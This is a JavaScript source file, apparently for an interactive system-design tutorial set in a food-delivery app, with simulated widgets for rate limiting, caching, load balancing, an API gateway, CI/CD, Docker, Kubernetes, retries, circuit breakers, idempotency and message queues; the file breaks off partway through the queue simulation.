/* ===== core helpers ===== */
const $=(s,r=document)=>r.querySelector(s);
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const rnd=(a,b)=>a+Math.random()*(b-a);
const ri=(a,b)=>Math.floor(rnd(a,b+1));
const pick=a=>a[Math.floor(Math.random()*a.length)];
const clamp=(v,a,b)=>Math.max(a,Math.min(b,v));
const pad=(n,w=2)=>String(n).padStart(w,'0');
const inr=n=>'₹'+Number(n).toLocaleString('en-IN');
const hex=n=>Math.floor(Math.random()*Math.pow(16,n)).toString(16).padStart(n,'0');
let UID=0;const uid=p=>p+(++UID);

function h(tag,props,...kids){
  const e=document.createElement(tag);
  for(const k in (props||{})){
    const v=props[k];
    if(k==='class')e.className=v;
    else if(k==='style')e.style.cssText=v;
    else if(k.slice(0,2)==='on'&&typeof v==='function')e.addEventListener(k.slice(2),v);
    else if(v===true)e.setAttribute(k,'');
    else if(v!==false&&v!=null)e.setAttribute(k,v);
  }
  for(const c of kids.flat(Infinity)){
    if(c==null||c===false)continue;
    e.append(c.nodeType?c:document.createTextNode(String(c)));
  }
  return e;
}
const btn=(label,fn,cls)=>h('button',{type:'button',class:'btn'+(cls?' '+cls:''),onclick:fn},label);
const pill=(t,c)=>h('span',{class:'pill '+(c||'')},t);
const code=t=>h('code',null,t);

function seg(opts,val,fn){
  const el=h('div',{class:'seg',role:'group'});
  const bs=opts.map(o=>{
    const v=Array.isArray(o)?o[0]:o, l=Array.isArray(o)?o[1]:o;
    const b=h('button',{type:'button','aria-pressed':String(String(v)===String(val)),onclick:()=>el.set(v,true)},l);
    b.dataset.v=String(v);
    return b;
  });
  el.append(...bs);
  el.value=val;
  el.set=(v,fire)=>{el.value=v;bs.forEach(b=>b.setAttribute('aria-pressed',String(b.dataset.v===String(v))));if(fire&&fn)fn(v)};
  return el;
}
function range(label,min,max,step,val,fn,fmt){
  const id=uid('r'),f=fmt||(v=>v),out=h('b',null,'');
  const inp=h('input',{type:'range',id,min,max,step,value:val});
  const upd=()=>{out.textContent=f(+inp.value)};
  inp.addEventListener('input',()=>{upd();fn(+inp.value)});
  upd();
  const el=h('label',{class:'rng',for:id},h('span',null,label+' · ',out),inp);
  el.get=()=>+inp.value;
  el.set=v=>{inp.value=v;upd()};
  el.lock=v=>{inp.disabled=v};
  return el;
}
function toggle(label,val,fn){
  const id=uid('c'),inp=h('input',{type:'checkbox',id});
  inp.checked=!!val;
  inp.addEventListener('change',()=>fn(inp.checked));
  const el=h('label',{class:'chk',for:id},inp,label);
  el.get=()=>inp.checked;
  el.set=v=>{inp.checked=v};
  return el;
}
function receipt(max=60){
  const el=h('div',{class:'receipt',role:'log'});
  const api={el,
    add(t,c){el.append(h('div',{class:c||''},t));while(el.children.length>max)el.firstChild.remove();el.scrollTop=el.scrollHeight;return api},
    clear(){el.replaceChildren();return api}};
  return api;
}
function stat(label,val,cls){
  const b=h('b',null,String(val));
  const el=h('div',{class:'stat'+(cls?' '+cls:'')},h('small',null,label),b);
  el.set=(v,c)=>{b.textContent=String(v);if(c!==undefined)el.className='stat'+(c?' '+c:'')};
  return el;
}
function meter(){
  const i=h('i');
  const el=h('div',{class:'meter'},i);
  el.set=(p,c)=>{i.style.width=clamp(p,0,100)+'%';i.style.background=c||''};
  return el;
}
function barRow(label,color){
  const m=meter(),v=h('span',{class:'mono val'},'');
  const el=h('div',{class:'barrow'},h('span',null,label),m,v);
  el.set=(p,txt,c)=>{m.set(p,c||color);v.textContent=txt};
  return el;
}
function live(el,ms,fn){
  let t=null;
  const on=()=>{if(!t)t=setInterval(fn,ms)},off=()=>{clearInterval(t);t=null};
  if('IntersectionObserver' in window){
    new IntersectionObserver(es=>{es[es.length-1].isIntersecting?on():off()}).observe(el);
  }else on();
}
function sparkSVG(vals,max,color){
  const w=240,hh=44,m=max||Math.max(1,...vals);
  const pts=vals.map((v,i)=>((i/Math.max(1,vals.length-1))*w).toFixed(1)+','+(hh-2-(Math.min(v,m)/m)*(hh-6)).toFixed(1)).join(' ');
  return `<svg viewBox="0 0 ${w} ${hh}" preserveAspectRatio="none" class="spark" aria-hidden="true"><polyline fill="none" stroke="${color||'var(--accent)'}" stroke-width="2" vector-effect="non-scaling-stroke" points="${pts}"/></svg>`;
}
function hash32(n){n=Math.imul(n^(n>>>16),0x45d9f3b);n=Math.imul(n^(n>>>16),0x45d9f3b);return (n^(n>>>16))>>>0}
function hashStr(s){let x=2166136261;for(let i=0;i<s.length;i++){x^=s.charCodeAt(i);x=Math.imul(x,16777619)}return x>>>0}
function mulberry(a){return()=>{a|=0;a=a+0x6D2B79F5|0;let t=Math.imul(a^a>>>15,1|a);t=t+Math.imul(t^t>>>7,61|t)^t;return((t^t>>>14)>>>0)/4294967296}}

/* ===== registry ===== */
const SECS=[
 ['infra','Core infrastructure & architecture','The path a request takes from the customer’s phone to the kitchen, and what keeps it alive when parts fail.'],
 ['data','Databases & performance','Where orders live, how fast they come back, and what happens when two people want the last biryani.'],
 ['ops','Deployments & reliability','Shipping new versions without dropping orders, and knowing when something is wrong.'],
 ['sec','Security','Who is allowed in, what they can touch, and what an attacker will try first.']
];
const CARDS=[];
function card(sec,id,title,tags,story,build,wide){CARDS.push({sec,id,title,tags,story,build,wide})}
function goTo(id){
  const el=document.getElementById('card-'+id);
  if(!el)return;
  const calm=window.matchMedia&&matchMedia('(prefers-reduced-motion: reduce)').matches;
  el.scrollIntoView({behavior:calm?'auto':'smooth',block:'start'});
  el.classList.add('flash');
  setTimeout(()=>el.classList.remove('flash'),1600);
}

/* ===== A · core infrastructure ===== */

card('infra','rate','Token-bucket rate limiter',['Rate Limiting'],
'A bot hammers POST /orders on a Friday night. The gateway allows a short burst, then admits requests only as fast as the bucket refills, and answers 429 with a Retry-After.',
body=>{
  let cap=8,rate=2,tokens=8,ok=0,no=0,bot=false;
  const cells=h('div',{class:'cells'}),R=receipt(),sOk=stat('Allowed',0,'good'),sNo=stat('Rejected 429',0,'bad');
  const draw=()=>cells.replaceChildren(...Array.from({length:cap},(_,i)=>h('i',{class:i<Math.floor(tokens)?'on':(i<tokens?'part':'')})));
  const send=()=>{
    if(tokens>=1){tokens-=1;ok++;R.add('POST /orders → 200 OK','ok')}
    else{no++;R.add('POST /orders → 429 Too Many Requests  Retry-After: '+((1-tokens)/rate).toFixed(1)+'s','err')}
    sOk.set(ok);sNo.set(no);draw();
  };
  body.append(
    h('div',{class:'ctrls'},btn('Send order',send,'pri'),btn('Burst ×10',()=>{for(let i=0;i<10;i++)send()}),toggle('Bot sending ~8 req/s',false,v=>{bot=v})),
    h('div',{class:'ctrls'},range('Bucket size (burst allowed)',1,20,1,cap,v=>{cap=v;tokens=Math.min(tokens,cap);draw()}),range('Refill tokens per second',1,10,1,rate,v=>{rate=v},v=>v+'/s')),
    cells,h('div',{class:'stats'},sOk,sNo),R.el);
  draw();R.add('Bucket starts full. Every request spends one token.','dim');
  live(body,100,()=>{tokens=Math.min(cap,tokens+rate*0.1);if(bot&&Math.random()<0.8)send();else draw()});
});

card('infra','cache','Cache-aside with TTL and LRU',['Caching'],
'Menus change rarely and are read constantly. Serve them from Redis, and only go to Postgres on a miss. A small cache evicts the least recently used entry.',
body=>{
  let ttl=8,cap=3,hit=0,miss=0,lat=0;const C=new Map();
  const R=receipt(),chips=h('div',{class:'chips'}),sH=stat('Hit ratio','–'),sL=stat('Average latency','–');
  const stats=()=>{const n=hit+miss;sH.set(Math.round(hit/n*100)+'%');sL.set(Math.round(lat/n)+' ms')};
  const get=id=>{
    const now=Date.now(),e=C.get(id);
    if(e&&e.exp>now){C.delete(id);C.set(id,e);hit++;lat+=2;R.add('GET menu:'+id+' → HIT   2 ms','ok')}
    else{
      C.delete(id);miss++;const t=ri(70,110);lat+=t;C.set(id,{exp:now+ttl*1000});
      R.add('GET menu:'+id+' → MISS '+t+' ms (read Postgres, SET EX '+ttl+')','err');
      while(C.size>cap){const k=C.keys().next().value;C.delete(k);R.add('evict menu:'+k+' (least recently used)','warn')}
    }
    stats();paint();
  };
  const paint=()=>{
    const now=Date.now();
    chips.replaceChildren(...(C.size?[...C].map(([k,e])=>h('span',{class:'chip'},'menu:'+k+' · '+Math.max(0,(e.exp-now)/1000).toFixed(1)+'s')):[h('span',{class:'dim sm'},'cache is empty')]));
  };
  const ids=[1,2,3,4,5,6].map(i=>btn('Open #'+i,()=>get(i)));
  body.append(
    h('div',{class:'ctrls'},ids,btn('Dinner rush ×20',()=>{const pool=[1,1,1,2,2,3,4,5,6];for(let i=0;i<20;i++)get(pick(pool))},'pri')),
    h('div',{class:'ctrls'},range('TTL',2,20,1,ttl,v=>{ttl=v},v=>v+' s'),range('Cache capacity',1,6,1,cap,v=>{cap=v},v=>v+' menus')),
    h('div',{class:'sm dim'},'Cached entries'),chips,h('div',{class:'stats'},sH,sL),R.el);
  R.add('Click a restaurant. First read is a miss, the next ones are hits until the TTL runs out.','dim');paint();
  live(body,250,()=>{const now=Date.now();for(const [k,e] of [...C])if(e.exp<=now){C.delete(k);R.add('menu:'+k+' expired (TTL)','dim')}paint()});
});

card('infra','lb','Load balancer algorithms',['Load Balancing'],
'Three app servers, one slower than the others. See how each algorithm spreads a dinner-rush burst, and what happens when you pull a server out.',
body=>{
  const S=[{n:'app-1',sp:3},{n:'app-2',sp:2},{n:'app-3',sp:1}].map(s=>({...s,a:0,t:0,down:false}));
  let algo='rr',rr=0,stream=false,drop=0;
  const sD=stat('Dropped (no healthy server)',0,'bad');
  S.forEach(s=>{
    s.m=meter();s.txt=h('div',{class:'sm mono'},'');
    s.kill=btn('Take down',()=>{s.down=!s.down;if(s.down)s.a=0;s.kill.textContent=s.down?'Bring back':'Take down';paint()});
    s.el=h('div',{class:'node'},h('b',null,s.n),h('div',{class:'sm dim'},'finishes '+s.sp+' requests per tick'),s.m,s.txt,s.kill);
  });
  const paint=()=>{S.forEach(s=>{s.m.set(s.a/30*100,s.a>20?'var(--bad)':'');s.txt.textContent=s.down?'DOWN':'in flight '+s.a+' · served '+s.t;s.el.className='node'+(s.down?' dim':(s.a>20?' bad':''))});sD.set(drop)};
  const dispatch=()=>{
    const up=S.filter(s=>!s.down);if(!up.length){drop++;return}
    let s;
    if(algo==='rr'){do{s=S[rr++%S.length]}while(s.down)}
    else if(algo==='lc')s=up.reduce((a,b)=>b.a<a.a?b:a);
    else s=pick(up);
    s.a++;
  };
  body.append(
    h('div',{class:'ctrls'},seg([['rr','Round robin'],['lc','Least connections'],['rand','Random']],algo,v=>{algo=v}),btn('Burst ×30',()=>{for(let i=0;i<30;i++)dispatch();paint()},'pri'),toggle('Steady stream (4 per tick)',false,v=>{stream=v})),
    h('div',{class:'nodes'},S.map(s=>s.el)),h('div',{class:'stats'},sD),
    h('div',{class:'sm dim'},'Round robin ignores that app-3 is slow, so its queue grows. Least connections notices and sends it less.'));
  paint();
  live(body,300,()=>{if(stream)for(let i=0;i<4;i++)dispatch();S.forEach(s=>{const d=Math.min(s.a,s.sp);s.a-=d;s.t+=d});paint()});
});

card('infra','gateway','Reverse proxy and API gateway',['Reverse Proxies','API Gateways'],
'One public hostname, api.foodrush.in, fronts four private services. The proxy terminates TLS and routes. The gateway layer adds auth, rate limits and caching before a request reaches your code.',
body=>{
  const RT=[['GET /menu/42','/menu','menu-svc:8001',false,true],['POST /orders','/orders','orders-svc:8002',true,false],['POST /payments','/payments','pay-svc:8003',true,false],['GET /admin/users','/admin','admin-svc:8009',true,false]];
  const names=['TLS termination','Route match','Authentication','Rate limit','Proxy cache','Upstream call'];
  let sel=1,jwt=true,admin=false,over=false;const warm=new Set(),R=receipt();
  const li=names.map(n=>h('li',{class:'step'},h('span',{class:'dot'},'·'),h('div',null,h('b',null,n),h('div',{class:'sm dim'},'not reached'))));
  const set=(i,st,t)=>{li[i].className='step '+st;li[i].firstChild.textContent=({ok:'✓',bad:'✗',skip:'–',run:'…'})[st]||'·';li[i].lastChild.lastChild.textContent=t};
  const go=()=>{
    const [label,prefix,up,auth,cacheable]=RT[sel];let status=200,end=false;
    names.forEach((_,i)=>set(i,'skip','not reached'));
    set(0,'ok','TLS 1.3 ends at the proxy. The hop to the service is plain HTTP on the private network.');
    set(1,'ok',prefix+' → '+up);
    if(auth){
      if(!jwt){set(2,'bad','No Authorization header → 401 Unauthorized');status=401;end=true}
      else if(prefix==='/admin'&&!admin){set(2,'bad','JWT is valid but role=customer and this route needs admin → 403 Forbidden');status=403;end=true}
      else set(2,'ok','JWT verified, role='+(admin?'admin':'customer')+', not expired');
    }else set(2,'ok','Public route, no token needed');
    if(!end){if(over){set(3,'bad','This client used 60 of 60 requests this minute → 429 Too Many Requests');status=429;end=true}else set(3,'ok','Within the limit (14 of 60 this minute)')}
    if(!end){
      if(cacheable&&warm.has(prefix)){set(4,'ok','HIT. The proxy answered in 2 ms and the service was never called.');end='cached'}
      else{set(4,cacheable?'ok':'skip',cacheable?'MISS. Response will be cached for 30 s.':'Not cacheable (writes and private data)');if(cacheable)warm.add(prefix)}
    }
    if(!end)set(5,'ok','proxy_pass http://'+up+' with X-Request-Id and X-Forwarded-For added → 200 OK');
    R.add(label+' → '+status+(end==='cached'?' (from proxy cache)':''),status<300?'ok':'err');
  };
  body.append(
    h('div',{class:'ctrls'},seg(RT.map((r,i)=>[i,r[0]]),sel,v=>{sel=+v}),btn('Send request',go,'pri')),
    h('div',{class:'ctrls'},toggle('Send a JWT',true,v=>{jwt=v}),toggle('JWT has role=admin',false,v=>{admin=v}),toggle('Client is over its rate limit',false,v=>{over=v})),
    h('ol',{class:'steps'},li),R.el);
  R.add('Pick a route and send. Try /admin without the admin role, then /menu twice.','dim');
});

card('infra','cicd','CI/CD pipeline',['CI/CD'],
'Every merge to main runs the same gauntlet. A failure stops the line, so production never sees a broken commit.',
body=>{
  const ST=[['Lint',4],['Unit tests',22],['Build image',48],['Vulnerability scan',19],['Push to registry',7],['Deploy to staging',35],['Smoke tests',12],['Deploy to production',41]];
  const FAIL={clean:-1,test:1,vuln:3,smoke:6},WHY={clean:'a clean change',test:'a change that breaks a unit test',vuln:'a change that adds a vulnerable dependency',smoke:'a change that breaks checkout on staging'};
  let mode='clean',busy=false,runs=0,live_=0;
  const R=receipt(),sR=stat('Pipeline runs',0),sD=stat('Reached production',0,'good'),sB=stat('Stopped before prod',0,'bad');
  const nodes=ST.map(s=>h('div',{class:'node dim'},h('b',null,s[0]),h('div',{class:'sm dim'},'idle')));
  const set=(i,c,t)=>{nodes[i].className='node '+c;nodes[i].lastChild.textContent=t};
  const stats=()=>{sR.set(runs);sD.set(live_);sB.set(runs-live_)};
  const run=async()=>{
    if(busy)return;busy=true;runs++;const sha=hex(7);
    ST.forEach((_,i)=>set(i,'dim','queued'));
    R.add('git push '+sha+' — '+WHY[mode],'dim');
    for(let i=0;i<ST.length;i++){
      set(i,'warn','running…');await sleep(360);
      if(i===FAIL[mode]){
        set(i,'bad','FAILED');R.add('✗ '+ST[i][0]+' failed. The pipeline stopped and production is untouched.','err');
        for(let j=i+1;j<ST.length;j++)set(j,'dim','skipped');
        busy=false;stats();return;
      }
      set(i,'ok','passed · '+ST[i][1]+' s');
    }
    live_++;R.add('✓ '+sha+' is live in production','ok');busy=false;stats();
  };
  body.append(
    h('div',{class:'ctrls'},seg([['clean','Clean commit'],['test','Failing test'],['vuln','Vulnerable dependency'],['smoke','Breaks on staging']],mode,v=>{mode=v}),btn('git push',run,'pri')),
    h('div',{class:'nodes'},nodes),h('div',{class:'stats'},sR,sD,sB),R.el);
});

card('infra','docker','Docker layer cache',['Docker'],
'An image is a stack of layers. Docker reuses every layer above the first change, so the order of your Dockerfile decides whether a one-line fix rebuilds in a second or in forty.',
body=>{
  let vp=1,vs=1,bad=false,prev=null;
  const GOOD=[['FROM node:20-alpine',null,2],['WORKDIR /app',null,0.1],['COPY package*.json ./','pkg',0.3],['RUN npm ci --omit=dev',null,38],['COPY src ./src','src',0.4],['CMD ["node","src/server.js"]',null,0]];
  const BAD=[['FROM node:20-alpine',null,2],['WORKDIR /app',null,0.1],['COPY . .','all',0.6],['RUN npm ci --omit=dev',null,38],['CMD ["node","src/server.js"]',null,0]];
  const rows=h('div',{class:'steps'}),sT=stat('Build time','–'),R=receipt();
  const build=why=>{
    const L=bad?BAD:GOOD;let key='',ok=true,total=0;const keys=[];rows.replaceChildren();
    L.forEach(([cmd,dep,cost],i)=>{
      const v=dep==='pkg'?vp:dep==='src'?vs:dep==='all'?vp+'.'+vs:'';
      key+='/'+cmd+'@'+v;keys.push(key);
      const hit=!!prev&&ok&&prev[i]===key;if(!hit){ok=false;total+=cost}
      rows.append(h('div',{class:'step '+(hit?'ok':'run')},h('span',{class:'dot'},hit?'✓':'●'),h('div',null,code(cmd),' ',pill(hit?'cached':'ran '+cost+' s',hit?'good':'warn'))));
    });
    prev=keys;sT.set(total.toFixed(1)+' s',total>10?'bad':'good');
    R.add(why+' → '+total.toFixed(1)+' s','dim');
  };
  body.append(
    h('div',{class:'ctrls'},btn('Edit src/server.js',()=>{vs++;build('Edited source')}),btn('Add an npm dependency',()=>{vp++;build('Changed package.json')}),btn('Rebuild, nothing changed',()=>build('No changes'))),
    toggle('Anti-pattern: COPY . . before npm ci',false,v=>{bad=v;build(v?'Switched to the bad Dockerfile':'Switched to the good Dockerfile')}),
    rows,h('div',{class:'stats'},sT),R.el);
  build('First build, nothing cached');
});

card('infra','k8s','Kubernetes self-healing and autoscaling',['Kubernetes'],
'You declare how many orders-api pods you want. A control loop compares reality with that wish, and starts or stops pods until they match.',
body=>{
  let manual=3,hpa=false,load=180,pods=[];
  const grid=h('div',{class:'nodes'}),line=h('div',{class:'mono sm'},''),R=receipt();
  const mk=()=>({id:'orders-api-'+hex(5),s:'Pending',age:0});
  for(let i=0;i<3;i++)pods.push({...mk(),s:'Running'});
  const rep=range('Desired replicas',1,8,1,manual,v=>{manual=v},v=>v);
  const render=()=>{
    const ready=pods.filter(p=>p.s==='Running').length;
    const cpu=ready?Math.min(100,Math.round(load/ready)):0,served=Math.min(load,ready*100);
    grid.replaceChildren(...pods.map(p=>h('div',{class:'node '+({Running:'ok',Pending:'warn',Failed:'bad',Terminating:'dim'})[p.s]},h('b',null,p.id),h('div',{class:'sm'},p.s+(p.s==='Running'?' · cpu '+cpu+'%':'')))));
    line.textContent=ready+' ready · serving '+served+' of '+load+' req/s'+(served<load?' · '+(load-served)+' req/s getting 503':'');
    line.className='mono sm '+(served<load?'errtext':'');
  };
  const tick=()=>{
    pods=pods.filter(p=>{if(p.s==='Failed'||p.s==='Terminating'){return false}return true});
    pods.forEach(p=>{if(p.s==='Pending'&&++p.age>=2)p.s='Running'});
    const want=hpa?clamp(Math.ceil(load/60),1,10):manual;
    const active=pods.filter(p=>p.s==='Running'||p.s==='Pending');
    if(active.length<want){for(let i=active.length;i<want;i++){const p=mk();pods.push(p);R.add('scheduler: starting '+p.id,'dim')}}
    else if(active.length>want)active.slice(want).forEach(p=>{p.s='Terminating';R.add('scaling down: stopping '+p.id,'dim')});
    render();
  };
  const kill=n=>{const run=pods.filter(p=>p.s==='Running');for(let i=0;i<n&&run.length;i++){const p=run.splice(ri(0,run.length-1),1)[0];p.s='Failed';R.add(p.id+' crashed. The controller will replace it.','err')}render()};
  body.append(
    h('div',{class:'ctrls'},btn('Kill a random pod',()=>kill(1),'bad'),btn('Node failure (kill 2)',()=>kill(2),'bad'),toggle('Autoscale on CPU (HPA)',false,v=>{hpa=v;rep.lock(v);R.add(v?'HPA on: targeting 60 req/s per pod':'HPA off: back to the replica slider','dim')})),
    h('div',{class:'ctrls'},rep,range('Incoming traffic',20,900,10,load,v=>{load=v},v=>v+' req/s')),
    grid,line,R.el);
  render();R.add('Each pod handles up to 100 req/s. Kill one, or raise traffic with autoscale on.','dim');
  live(body,700,tick);
});

card('infra','discovery','Service registry and heartbeats',['Service Discovery'],
'Pods come and go, so nobody hard-codes an IP. Instances register and send heartbeats, and clients ask the registry where payments lives right now.',
body=>{
  let ttl=6,next=11,rr=0;const I=[],list=h('div',{class:'nodes'}),R=receipt();
  const add=()=>{
    const ip='10.0.0.'+(next++),i={ip,alive:true,seen:Date.now(),m:meter(),t:h('div',{class:'sm dim'},'registered')};
    i.el=h('div',{class:'node ok'},h('b',null,ip+':8003'),i.t,i.m,btn('Crash it',()=>{if(!i.alive)return;i.alive=false;R.add(ip+' crashed. The registry still lists it until its TTL runs out.','warn')},'bad'));
    I.push(i);list.append(i.el);R.add(ip+' registered as payments-service','ok');
  };
  const resolve=()=>{
    if(!I.length){R.add('resolve payments → no instances. Callers get 503.','err');return}
    const i=I[rr++%I.length];
    if(i.alive)R.add('resolve payments → '+i.ip+':8003, connected','ok');
    else R.add('resolve payments → '+i.ip+':8003, connection refused (stale entry), client tries the next address','err');
  };
  add();add();add();
  body.append(
    h('div',{class:'ctrls'},btn('Start an instance',add),btn('Resolve payments.internal',resolve,'pri'),range('Heartbeat TTL',2,15,1,ttl,v=>{ttl=v},v=>v+' s')),
    list,R.el);
  live(body,500,()=>{
    const now=Date.now();
    for(const i of [...I]){
      if(i.alive)i.seen=now;
      const age=(now-i.seen)/1000,rem=ttl-age;
      i.t.textContent=i.alive?'healthy · heartbeat just now':'silent · removed in '+Math.max(0,rem).toFixed(1)+' s';
      i.m.set(Math.max(0,rem)/ttl*100,i.alive?'':'var(--warn)');
      i.el.className='node '+(i.alive?'ok':'warn');
      if(rem<=0){I.splice(I.indexOf(i),1);i.el.remove();R.add(i.ip+' deregistered (missed heartbeats)','err')}
    }
  });
});

card('infra','retry','Timeouts, retries and exponential backoff',['Timeouts','Retries','Exponential Backoff'],
'Stripe is slow today. The client gives each attempt a deadline, retries a few times, and waits longer between each try. Add jitter or every client retries at the same instant.',
body=>{
  let fail=40,base=300,timeout=700,maxR=3,strat='jitter';
  const tl=h('div',{class:'tl'}),R=receipt(),hist=h('div',{class:'hist'}),histNote=h('div',{class:'sm dim'},'');
  const delay=n=>{
    if(strat==='none')return 0;if(strat==='fixed')return 200;
    const d=Math.min(5000,100*Math.pow(2,n-1));return strat==='exp'?d:rnd(0,d);
  };
  const callIt=()=>{
    let t=0,done=false;const segs=[];R.clear();
    for(let a=0;a<=maxR;a++){
      const lat=base*rnd(.6,1.5);let kind,dur;
      if(lat>timeout){kind='timeout';dur=timeout}else if(Math.random()*100<fail){kind='error';dur=lat}else{kind='ok';dur=lat}
      segs.push({t0:t,t1:t+dur,kind});
      R.add('attempt '+(a+1)+': '+(kind==='ok'?'200 OK':kind==='timeout'?'no answer, gave up at the '+timeout+' ms deadline':'503 Service Unavailable')+' after '+Math.round(dur)+' ms',kind==='ok'?'ok':'err');
      t+=dur;if(kind==='ok'){done=true;break}
      if(a<maxR){const d=delay(a+1);if(d>1){segs.push({t0:t,t1:t+d,kind:'wait'});R.add('  waiting '+Math.round(d)+' ms before retry '+(a+1),'dim')}t+=d}
    }
    R.add(done?'✓ succeeded in '+Math.round(t)+' ms total':'✗ gave up after '+(maxR+1)+' attempts ('+Math.round(t)+' ms). Caller shows an error.',done?'ok':'err');
    const W=Math.max(t,1000);
    tl.replaceChildren(...segs.map(s=>h('i',{class:s.kind,style:'left:'+(s.t0/W*100)+'%;width:'+((s.t1-s.t0)/W*100)+'%'})));
  };
  const herd=()=>{
    const bins=new Array(24).fill(0);
    for(let c=0;c<40;c++){let t=0;for(let n=1;n<=3;n++){t+=delay(n);const b=Math.floor(t/50);if(b<bins.length)bins[b]++}}
    const mx=Math.max(...bins);
    hist.replaceChildren(...bins.map(v=>h('i',{style:'height:'+Math.max(2,v/mx*100)+'%',title:v+' retries'})));
    histNote.textContent='40 clients all failed at t=0. Retries per 50 ms slice over the next 1.2 s. Busiest slice: '+mx+' requests.';
  };
  body.append(
    h('div',{class:'ctrls'},range('Service failure rate',0,100,5,fail,v=>{fail=v},v=>v+'%'),range('Typical latency',50,1500,50,base,v=>{base=v},v=>v+' ms')),
    h('div',{class:'ctrls'},range('Client timeout',100,1500,50,timeout,v=>{timeout=v},v=>v+' ms'),range('Max retries',0,5,1,maxR,v=>{maxR=v})),
    h('div',{class:'ctrls'},seg([['none','Immediate'],['fixed','Fixed 200 ms'],['exp','Exponential'],['jitter','Exponential + jitter']],strat,v=>{strat=v;herd()}),btn('Call payments',callIt,'pri')),
    tl,h('div',{class:'legend'},pill('ok','good'),pill('503','bad'),pill('timeout','warn'),pill('backoff wait','')),R.el,
    h('div',{class:'sm dim'},'Thundering herd: when everyone retries together'),hist,histNote);
  callIt();herd();
});

card('infra','breaker','Circuit breaker',['Circuit Breakers'],
'When payments is down, every call burns 800 ms before failing. After a few failures the breaker opens and fails fast, then sends one probe to see if the service is back.',
body=>{
  let state='closed',fails=0,thr=4,openFor=5,openUntil=0,healthy=true,auto=false,fast=0,saved=0,calls=0;
  const R=receipt(),badge=h('div',{class:'bigstate'},''),info=h('div',{class:'sm dim'},''),sF=stat('Failed fast',0),sS=stat('Wait avoided',0,'good'),sC=stat('Calls that reached payments',0);
  const paint=()=>{
    const left=Math.max(0,(openUntil-Date.now())/1000);
    badge.textContent=state==='closed'?'CLOSED':state==='open'?'OPEN':'HALF-OPEN';
    badge.className='bigstate '+(state==='closed'?'good':state==='open'?'bad':'warn');
    info.textContent=state==='closed'?'Requests flow through. Consecutive failures: '+fails+' of '+thr:state==='open'?'Failing fast. Probing again in '+left.toFixed(1)+' s':'The next request is a probe. One success closes the breaker.';
    sF.set(fast);sS.set((saved/1000).toFixed(1)+' s');sC.set(calls);
  };
  const send=()=>{
    const now=Date.now();
    if(state==='open'&&now>=openUntil)state='half';
    if(state==='open'){fast++;saved+=800;R.add('breaker OPEN → failed in 0 ms. Fallback: offer pay on delivery.','warn');paint();return}
    calls++;
    if(!healthy){
      R.add((state==='half'?'probe':'call')+' → timeout after 800 ms','err');
      if(state==='half'){state='open';openUntil=now+openFor*1000;R.add('probe failed → breaker OPEN again','err')}
      else{fails++;if(fails>=thr){state='open';openUntil=now+openFor*1000;R.add(fails+' failures in a row → breaker OPEN for '+openFor+' s','err')}}
    }else{
      R.add((state==='half'?'probe':'call')+' → 200 OK (120 ms)','ok');
      if(state==='half')R.add('probe succeeded → breaker CLOSED','ok');
      state='closed';fails=0;
    }
    paint();
  };
  body.append(
    h('div',{class:'ctrls'},btn('Send payment request',send,'pri'),toggle('Payments is healthy',true,v=>{healthy=v;R.add('payments is now '+(v?'healthy':'failing'),'dim')}),toggle('Send 2 requests per second',false,v=>{auto=v})),
    h('div',{class:'ctrls'},range('Open after N failures',2,8,1,thr,v=>{thr=v}),range('Stay open for',2,10,1,openFor,v=>{openFor=v},v=>v+' s')),
    badge,info,h('div',{class:'stats'},sF,sS,sC),R.el);
  paint();
  live(body,500,()=>{if(auto)send();else{if(state==='open'&&Date.now()>=openUntil)state='half';paint()}});
});

card('infra','idem','Idempotency keys',['Idempotency'],
'The customer double-taps Pay on a flaky 4G connection, and the app also retries after a timeout. Without an idempotency key, the card is charged each time.',
body=>{
  let useKey=false,order=hex(4),n=0,total=0,orders=1;const store=new Map(),charges=[],R=receipt();
  const sC=stat('Charges created',0),sM=stat('Money taken',inr(0)),sO=stat('Overcharged',inr(0),'good'),list=h('div',{class:'chips'});
  const stats=()=>{const over=(charges.length-orders)*649;sC.set(charges.length);sM.set(inr(charges.length*649));sO.set(inr(over),over>0?'bad':'good');list.replaceChildren(...charges.map(c=>h('span',{class:'chip'},c)))};
  const post=why=>{
    const key='order-'+order;
    if(useKey&&store.has(key)){R.add(why+': POST /charge  Idempotency-Key: '+key+' → 200, replayed '+store.get(key)+'. No new charge.','ok');return}
    const id='ch_'+hex(5);charges.push(id);if(useKey)store.set(key,id);
    const dup=charges.filter((_,i)=>true).length>orders;
    R.add(why+': POST /charge'+(useKey?'  Idempotency-Key: '+key:'')+' → 201 created '+id+' for '+inr(649),(charges.length>orders)?'err':'ok');
    stats();
  };
  body.append(
    h('div',{class:'ctrls'},toggle('Send an Idempotency-Key header',false,v=>{useKey=v;R.add(v?'Server now remembers each key and replays the first result.':'Server treats every request as new.','dim')})),
    h('div',{class:'ctrls'},btn('Pay '+inr(649),()=>post('Tap'),'pri'),btn('Double-tap or timeout retry',()=>post('Retry')),btn('Start a new order',()=>{order=hex(4);orders++;R.add('— new order, new key —','dim');stats()})),
    h('div',{class:'stats'},sC,sM,sO),list,R.el);
  R.add('Order total is '+inr(649)+'. Tap Pay, then tap the retry button.','dim');stats();
});

card('infra','queue','Message queue with dead-letter queue',['Message Queues','Dead Letter Queues'],
'Orders go onto a queue so a slow kitchen service never blocks checkout. A message that keeps failing is parked in a dead-letter queue instead of looping forever.',
body=>{
  let q=[],dlq=[],done=0,consumers=2,maxA=3,auto=false,seq=100;
  const qEl=h('div',{class:'chips'}),dEl=h('div',{class:'chips'}),cEl=h('div',{class:'nodes'}),R=receipt(),sD=stat('Processed',0,'good'),sQ=stat('Waiting',0),sX=stat('In DLQ',0);
  const msg=poison=>({id:'#'+(seq++),poison,at:0});
  const paint=(cur)=>{
    qEl.replaceChildren(...(q.length?q.slice(0,14).map(m=>h('span',{class:'chip'+(m.poison?' badchip':'')},m.id+(m.at?' ×'+m.at:''))).concat(q.length>14?[h('span',{class:'dim sm'},'+'+(q.length-14)+' more')]:[]):[h('span',{class:'dim sm'},'empty')]));
    dEl.replaceChildren(...(dlq.length?dlq.map(m=>h('span',{class:'chip badchip'},m.id)):[h('span',{class:'dim sm'},'empty')]));
    cEl.replaceChildren(...Array.from({length:consumers},(_,i)=>h('div',{class:'node'+(cur&&cur[i]?' warn':' dim')},h('b',null,'consumer '+(i+1)),h('div',{class:'sm'},cur&&cur[i]?'working on '+cur[i]:'idle'))));
    sD.set(done);sQ.set(q.length);sX.set(dlq.length,dlq.length?'bad':'');
  };
  const tick=()=>{
